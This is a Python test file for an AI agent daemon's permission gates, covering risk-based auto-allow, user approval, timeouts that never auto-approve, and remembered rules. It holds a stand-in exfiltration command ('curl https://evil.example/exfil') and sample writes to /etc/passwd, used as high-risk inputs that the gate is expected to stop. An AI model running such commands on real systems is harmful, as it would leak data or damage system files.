"""`SessionService`-level integration tests for the review gate + user gate
(Issue #11 G04/G06/N03, and the approval-timeout/`remember` requirements from
the Issue's checklist), driven by `fake_acp_agent.py`'s `CUSTOM_PERMISSION_JSON`
marker (see that file for why "NEEDS_PERMISSION" alone isn't enough — it never
carries a real tool name/args, so it can't exercise risk-based branching).

The rule gate itself (`kernel/plugin/jones_gate`) never talks to the daemon
(see that package's module docstring) — its G04/G05/N12 coverage lives in
`tests/test_gates_rule_gate.py` instead, which is the honest way to test it.
This file covers the daemon-side half: `_on_request_permission`'s
classify()-based auto-allow/user-gate branching, the approval timeout, and
`permission.decide(remember=...)`.
"""

from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path
from typing import Any

from jones_daemon.context import DaemonContext, NullProviderResolver
from jones_daemon.kernel.plugin.jones_gate import _review_payload
from jones_daemon.sessions import queries
from jones_daemon.sessions import service as service_module
from jones_daemon.sessions.service import (
    DEFAULT_AGENT_ID,
    DEFAULT_PROJECT_ID,
    SessionService,
    _extract_tool_call,
)
from jones_daemon.store import apply_pending, connect, run_in_db_thread

_FAKE_AGENT = str(Path(__file__).parent / "fake_acp_agent.py")


class FakeServer:
    def __init__(self) -> None:
        self.broadcasts: list[tuple[str, str, Any]] = []

    async def broadcast(self, session_id: str, method: str, params: Any) -> None:
        self.broadcasts.append((session_id, method, params))

    def events(self, method: str) -> list[tuple[str, Any]]:
        return [(sid, p) for sid, m, p in self.broadcasts if m == method]


class FakeConfigResolver:
    """A `ConfigResolver` a test can steer directly — `NullConfigResolver`
    always returns empty dicts, which can't exercise `approval_timeout_
    minutes` or a real `permissions.json` merge result."""

    def __init__(self, *, approval_timeout_minutes: float | None = None) -> None:
        self._approval_timeout_minutes = approval_timeout_minutes

    def settings(self, project_id: str | None) -> dict[str, Any]:
        return {"approval_timeout_minutes": self._approval_timeout_minutes}

    def permissions(self, project_id: str | None) -> dict[str, Any]:
        return {}

    def mcp_servers(self, project_id: str | None) -> list[dict[str, Any]]:
        return []


async def _make_service(tmp_path, monkeypatch, *, config=None) -> SessionService:
    monkeypatch.setenv("JONES_HOME", str(tmp_path))
    monkeypatch.setenv("FAKE_ACP_MODE", "normal")

    def _open() -> Any:
        conn = connect(tmp_path / "jones.db")
        apply_pending(conn)
        return conn

    conn = await run_in_db_thread(_open)
    from jones_daemon import paths

    ctx = DaemonContext(
        db=conn,
        paths=paths,
        server=FakeServer(),
        providers=NullProviderResolver(),
        config=config if config is not None else FakeConfigResolver(),
    )
    service = SessionService(ctx, worker_cmd=[sys.executable, _FAKE_AGENT])
    await service.worker_manager.start()
    return service


async def _new_session(service: SessionService, *, mode: str = "auto") -> str:
    row = await service.create(
        project_id=DEFAULT_PROJECT_ID, agent_id=DEFAULT_AGENT_ID, mode=mode, title="t"
    )
    return row["id"]


async def _wait_until(predicate, *, timeout: float = 5.0, interval: float = 0.02) -> None:
    loop = asyncio.get_running_loop()
    deadline = loop.time() + timeout
    while loop.time() < deadline:
        if predicate():
            return
        await asyncio.sleep(interval)
    raise AssertionError(f"condition not met within {timeout}s")


def _custom_permission_prompt(tool: str, args: dict[str, Any], *, mode: str, **extra: Any) -> str:
    encoded = _review_payload.encode(tool, args, mode=mode)
    payload = {"toolCall": {"toolCallId": "gate-1", "title": tool,
                             "rawInput": {"command": f"<{tool}> (plugin approval rule)",
                                          "description": encoded}}}
    payload.update(extra)
    return f"CUSTOM_PERMISSION_JSON:{json.dumps(payload)}"


async def test_auto_mode_low_risk_auto_allows_with_no_pending_broadcast(tmp_path, monkeypatch):
    service = await _make_service(tmp_path, monkeypatch)
    try:
        session_id = await _new_session(service, mode="auto")
        prompt = _custom_permission_prompt("read_file", {"path": "/tmp/x"}, mode="auto")
        await service.send(session_id, prompt)
        await _wait_until(
            lambda: service.ctx.server.events("permission.decided")
            or service.ctx.server.events("run.terminated")
        )
        assert service.ctx.server.events("permission.requested") == []
        decided = service.ctx.server.events("permission.decided")
        assert decided, "expected an instant permission.decided"
        row = decided[0][1]
        assert row["decision"] == "allow"
        assert row["decided_by"] == "rule"
        assert row["gate"] == "review"
    finally:
        await service.shutdown()


async def test_auto_mode_high_risk_still_goes_through_the_user_gate(tmp_path, monkeypatch):
    service = await _make_service(tmp_path, monkeypatch)
    try:
        session_id = await _new_session(service, mode="auto")
        prompt = _custom_permission_prompt(
            "terminal", {"command": "curl https://evil.example/exfil"}, mode="auto"
        )
        await service.send(session_id, prompt)
        await _wait_until(lambda: service.ctx.server.events("permission.requested"))
        requested = service.ctx.server.events("permission.requested")[0][1]
        assert requested["risk"] == "high"
        pending = await service.permission_pending(session_id)
        assert len(pending) == 1
        await service.permission_decide(pending[0]["request_id"], "deny")
        await _wait_until(lambda: service.ctx.server.events("permission.decided"))
        decided = service.ctx.server.events("permission.decided")[0][1]
        assert decided["decision"] == "deny"
        assert decided["decided_by"] == "user"
    finally:
        await service.shutdown()


async def test_task_mode_low_risk_auto_allows_with_no_pending_broadcast_G06(tmp_path, monkeypatch):
    # PRD 9.1's task-mode row: "允许；只读工具直接放行，改变外部世界的动作逐条走
    # 三道闸" — a read-only (low-risk) tool must NOT interrupt the user in task
    # mode either, only auto's low-risk path was wired that way originally
    # (review finding #4, 2026-09-19: the pre-fix version of this test
    # asserted the OPPOSITE of PRD 9.1 and is why the bug shipped — see git
    # history for the version this replaces).
    service = await _make_service(tmp_path, monkeypatch)
    try:
        session_id = await _new_session(service, mode="task")
        prompt = _custom_permission_prompt("read_file", {"path": "/tmp/x"}, mode="task")
        await service.send(session_id, prompt)
        await _wait_until(
            lambda: service.ctx.server.events("permission.decided")
            or service.ctx.server.events("run.terminated")
        )
        assert service.ctx.server.events("permission.requested") == []
        decided = service.ctx.server.events("permission.decided")
        assert decided, "expected an instant permission.decided"
        row = decided[0][1]
        assert row["decision"] == "allow"
        assert row["decided_by"] == "rule"
        assert row["gate"] == "review"
    finally:
        await service.shutdown()


async def test_task_mode_write_action_still_goes_through_the_user_gate_G06(tmp_path, monkeypatch):
    # The other half of PRD 9.1's task-mode row: a WRITE action (something
    # that changes the outside world, not read-only) still gates individually
    # in task mode regardless of how low-risk it might otherwise look —
    # `write_file`/`patch` are never `low` by `permissions/review.py::
    # classify()`'s own rules (see `_classify_write`), so this exercises the
    # "everything but read-only tools" half task mode is actually about.
    service = await _make_service(tmp_path, monkeypatch)
    try:
        session_id = await _new_session(service, mode="task")
        prompt = _custom_permission_prompt(
            "terminal", {"command": "echo hi"}, mode="task"
        )
        await service.send(session_id, prompt)
        await _wait_until(lambda: service.ctx.server.events("permission.requested"))
        requested = service.ctx.server.events("permission.requested")[0][1]
        assert requested["risk"] in ("medium", "high")
        pending = await service.permission_pending(session_id)
        await service.permission_decide(pending[0]["request_id"], "allow")
        await _wait_until(lambda: service.ctx.server.events("permission.decided"))
    finally:
        await service.shutdown()


async def test_edit_approval_raw_input_shape_is_classified_with_real_args(tmp_path, monkeypatch):
    # `acp_adapter/edit_approval.py`'s shape: {"tool", "arguments"} — real
    # structured args, no `_review_payload` decoding involved.
    service = await _make_service(tmp_path, monkeypatch)
    try:
        session_id = await _new_session(service, mode="task")
        payload = {
            "toolCall": {
                "toolCallId": "edit-1", "title": "Approve edit: /etc/passwd",
                "rawInput": {
                    "tool": "write_file",
                    "arguments": {"path": "/etc/passwd", "content": "x"},
                },
            },
        }
        await service.send(session_id, f"CUSTOM_PERMISSION_JSON:{json.dumps(payload)}")
        await _wait_until(lambda: service.ctx.server.events("permission.requested"))
        requested = service.ctx.server.events("permission.requested")[0][1]
        # cwd is unknown to the review gate here (DEFAULT_PROJECT_ID resolves
        # to the real machine's home dir, not this test's tmp_path — the
        # point of this test is the SHAPE decoding, not path classification)
        # so /etc/passwd being outside whatever that workspace is doesn't
        # matter; what matters is the tool name/path were recovered at all.
        assert requested["risk"] in ("low", "medium", "high")
        pending = await service.permission_pending(session_id)
        assert pending[0]["tool_call"]["rawInput"]["arguments"]["path"] == "/etc/passwd"
    finally:
        await service.shutdown()


async def test_approval_timeout_denies_and_terminates_the_run(tmp_path, monkeypatch):
    # ~6ms timeout: fast enough for a unit test, long enough that the fake
    # agent's own `wait_timeout` (default 30s) is never what fires first.
    service = await _make_service(
        tmp_path, monkeypatch, config=FakeConfigResolver(approval_timeout_minutes=0.0001)
    )
    try:
        session_id = await _new_session(service, mode="task")
        prompt = _custom_permission_prompt("terminal", {"command": "ls"}, mode="task")
        await service.send(session_id, prompt)
        await _wait_until(lambda: service.ctx.server.events("run.terminated"), timeout=5.0)
        terminated = service.ctx.server.events("run.terminated")[0][1]
        assert terminated["kind"] == "error"
        assert "审批超时" in terminated["reason"] or "timed out" in terminated["reason"]
        decided = service.ctx.server.events("permission.decided")
        assert decided and decided[0][1]["decision"] == "deny"
        assert decided[0][1]["decided_by"] == "timeout"
    finally:
        await service.shutdown()


async def test_approval_timeout_never_auto_approves(tmp_path, monkeypatch):
    # PRD 9.4: "不提供「超时自动批准」选项" — the option actually selected on
    # timeout must be a deny/reject kind, never an allow kind.
    service = await _make_service(
        tmp_path, monkeypatch, config=FakeConfigResolver(approval_timeout_minutes=0.0001)
    )
    try:
        session_id = await _new_session(service, mode="task")
        prompt = _custom_permission_prompt("terminal", {"command": "ls"}, mode="task")
        await service.send(session_id, prompt)
        await _wait_until(lambda: service.ctx.server.events("permission.decided"), timeout=5.0)
        decision_row = service.ctx.server.events("permission.decided")[0][1]
        assert decision_row["decision"] == "deny"
    finally:
        await service.shutdown()


# Review finding #13 (2026-09-19): `_extract_tool_call` threads a mode hint
# (decoded from the rule gate's own `jones_gate.json` snapshot) alongside
# the tool name/args, so `_on_request_permission` can gate on the mode the
# RULE gate actually saw instead of unconditionally re-reading the (possibly
# since mid-Run-changed) live session mode.


def test_extract_tool_call_returns_the_encoded_mode_hint_for_the_generic_shape():
    encoded = _review_payload.encode("terminal", {"command": "ls"}, mode="auto")
    params = {
        "toolCall": {
            "rawInput": {"command": "terminal (plugin approval rule)", "description": encoded}
        }
    }
    tool_name, args, mode_hint = _extract_tool_call(params)
    assert (tool_name, args, mode_hint) == ("terminal", {"command": "ls"}, "auto")


def test_extract_tool_call_has_no_mode_hint_for_the_edit_approval_shape():
    params = {
        "toolCall": {"rawInput": {"tool": "write_file", "arguments": {"path": "/tmp/x"}}}
    }
    _tool_name, _args, mode_hint = _extract_tool_call(params)
    assert mode_hint is None


async def test_send_snapshots_the_turn_start_mode_for_the_review_gate(tmp_path, monkeypatch):
    service = await _make_service(tmp_path, monkeypatch)
    try:
        session_id = await _new_session(service, mode="auto")
        assert session_id not in service._turn_mode_snapshot
        prompt = _custom_permission_prompt("read_file", {"path": "/tmp/x"}, mode="auto")
        await service.send(session_id, prompt)
        # Written synchronously inside `send()`'s immediate-start branch,
        # before the Turn's task is even scheduled — no need to wait for
        # anything to observe it.
        assert service._turn_mode_snapshot[session_id] == "auto"
    finally:
        await service.shutdown()


async def test_edit_approval_shape_times_out_at_hermes_own_ceiling(tmp_path, monkeypatch):
    # Review finding #5 (2026-09-19): the edit-approval ACP path
    # (`{"tool","arguments"}` rawInput) travels over a channel that Hermes
    # itself hard-times-out after 60s, independent of anything Jones
    # configures — even with NO `settings.approval_timeout_minutes` set
    # (PRD 9.4's "默认不超时"), the daemon's own wait for THIS shape must
    # still give up around that same ceiling, not hang indefinitely while
    # the underlying edit has already been auto-denied. Monkeypatches the
    # ceiling constant down to a test-speed value rather than actually
    # waiting 60s.
    monkeypatch.setattr(service_module, "_EDIT_APPROVAL_HERMES_TIMEOUT_SECONDS", 0.01)
    service = await _make_service(tmp_path, monkeypatch, config=FakeConfigResolver())
    try:
        session_id = await _new_session(service, mode="task")
        payload = {
            "toolCall": {
                "toolCallId": "edit-1", "title": "Approve edit: /etc/passwd",
                "rawInput": {
                    "tool": "write_file",
                    "arguments": {"path": "/etc/passwd", "content": "x"},
                },
            },
        }
        await service.send(session_id, f"CUSTOM_PERMISSION_JSON:{json.dumps(payload)}")
        await _wait_until(lambda: service.ctx.server.events("run.terminated"), timeout=5.0)
        terminated = service.ctx.server.events("run.terminated")[0][1]
        assert terminated["kind"] == "error"
        assert "edit-approval channel" in terminated["reason"] or "60s" in terminated["reason"]
        decided = service.ctx.server.events("permission.decided")
        assert decided and decided[0][1]["decision"] == "deny"
        assert decided[0][1]["decided_by"] == "timeout"
    finally:
        await service.shutdown()


async def test_edit_approval_shape_uses_the_tighter_of_the_two_timeouts(tmp_path, monkeypatch):
    # A `settings.approval_timeout_minutes` SHORTER than Hermes's own 60s
    # ceiling still wins — the two bounds are combined with `min()`, neither
    # one is simply ignored in favor of the other.
    monkeypatch.setattr(service_module, "_EDIT_APPROVAL_HERMES_TIMEOUT_SECONDS", 60.0)
    service = await _make_service(
        tmp_path, monkeypatch, config=FakeConfigResolver(approval_timeout_minutes=0.0001)
    )
    try:
        session_id = await _new_session(service, mode="task")
        payload = {
            "toolCall": {
                "toolCallId": "edit-1", "title": "Approve edit: /etc/passwd",
                "rawInput": {
                    "tool": "write_file",
                    "arguments": {"path": "/etc/passwd", "content": "x"},
                },
            },
        }
        await service.send(session_id, f"CUSTOM_PERMISSION_JSON:{json.dumps(payload)}")
        await _wait_until(lambda: service.ctx.server.events("run.terminated"), timeout=5.0)
        terminated = service.ctx.server.events("run.terminated")[0][1]
        # The shorter, Jones-configured timeout is what actually fired here
        # (0.0001min ≈ 6ms), not the 60s Hermes ceiling -> generic reason.
        assert "审批超时" in terminated["reason"]
        assert "edit-approval channel" not in terminated["reason"]
    finally:
        await service.shutdown()


async def test_remember_session_persists_an_allow_rule_for_this_session_only(tmp_path, monkeypatch):
    # Deliberately does NOT drive a second real Turn through the fake worker
    # after the permission round trip: doing so reproduces a hang that is
    # confirmed pre-existing on `main` (unrelated to this branch — a second
    # `session/prompt` on a worker that has already done one
    # `session/request_permission` round trip never returns during process
    # teardown; repro'd with zero W3 code involved, using only
    # "NEEDS_PERMISSION" + a second `send()`). Reported separately (see the
    # PR report's "评审关注点"); `_refresh_gate_config` is exercised directly
    # here instead, which is what actually needs to be proven — that a
    # `remember="session"` rule reaches the written file, not that a second
    # worker turn happens to run afterward.
    service = await _make_service(tmp_path, monkeypatch)
    try:
        session_id = await _new_session(service, mode="task")
        prompt = _custom_permission_prompt("terminal", {"command": "git status"}, mode="task")
        await service.send(session_id, prompt)
        await _wait_until(lambda: service.ctx.server.events("permission.requested"))
        pending = await service.permission_pending(session_id)
        await service.permission_decide(pending[0]["request_id"], "allow", remember="session")
        assert service._session_remembered_rules[session_id] == [
            {"match": "git status", "action": "allow"}
        ]
        await _wait_until(lambda: not (session_id in service._turn_tasks and
                                        not service._turn_tasks[session_id].done()))
        session_row = await service.get(session_id)
        await service._refresh_gate_config(session_row)

        from jones_daemon.permissions import gate_config

        hermes_home = gate_config.hermes_home_for(service.ctx.paths.user_root(), session_id)
        written = json.loads(gate_config.gate_config_path(hermes_home).read_text(encoding="utf-8"))
        assert {"match": "git status", "action": "allow"} in written["rules"]
    finally:
        await service.shutdown()


async def test_remember_project_writes_to_the_projects_permissions_json(tmp_path, monkeypatch):
    # `_cwd_for_project` only resolves DEFAULT_PROJECT_ID today (to the real
    # machine's home dir — see that method's own docstring); monkeypatching
    # it to a tmp_path is the same technique
    # test_sessions_service.py::test_unexpected_exception_in_run_turn_still_terminates_the_run
    # already uses to isolate a project-path-dependent test from that gap,
    # so this test's `permissions.json` write never touches a real machine.
    project_path = tmp_path / "project"
    project_path.mkdir()
    monkeypatch.setattr(SessionService, "_cwd_for_project", lambda self, pid: str(project_path))
    service = await _make_service(tmp_path, monkeypatch)
    try:
        session_id = await _new_session(service, mode="task")
        prompt = _custom_permission_prompt("terminal", {"command": "git status"}, mode="task")
        await service.send(session_id, prompt)
        await _wait_until(lambda: service.ctx.server.events("permission.requested"))
        pending = await service.permission_pending(session_id)
        await service.permission_decide(pending[0]["request_id"], "allow", remember="project")
        await _wait_until(
            lambda: (project_path / ".jones" / "permissions.json").exists()
        )
        perms_path = project_path / ".jones" / "permissions.json"
        data = json.loads(perms_path.read_text(encoding="utf-8"))
        assert {"match": "git status", "action": "allow"} in data["rules"]
    finally:
        await service.shutdown()


async def test_chat_mode_send_completes_with_zero_tool_calls_N12(tmp_path, monkeypatch):
    service = await _make_service(tmp_path, monkeypatch)
    try:
        session_id = await _new_session(service, mode="chat")
        await service.send(session_id, "just chatting, no tools")
        await _wait_until(
            lambda: any(m == "message.completed" for _sid, m, _p in service.ctx.server.broadcasts)
        )
        steps = await run_in_db_thread(
            queries.list_run_steps, service.ctx.db,
            (await run_in_db_thread(queries.latest_turn, service.ctx.db, session_id))["run_id"],
        )
        assert steps == []
    finally:
        await service.shutdown()
